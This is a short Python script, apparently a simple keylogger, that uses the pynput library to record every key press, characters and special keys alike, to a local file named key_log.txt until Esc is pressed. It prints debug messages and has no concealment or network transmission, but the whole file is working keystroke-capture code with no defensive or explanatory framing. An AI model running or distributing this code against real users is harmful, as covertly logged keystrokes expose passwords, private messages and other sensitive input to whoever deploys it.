from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    print(f'Key pressed: {key}')  # Debugging line
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        print('Esc key pressed, exiting...')  # Debugging line
        return False

print('Starting keylogger...')  # Debugging line
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
print('Keylogger stopped.')  # Debugging line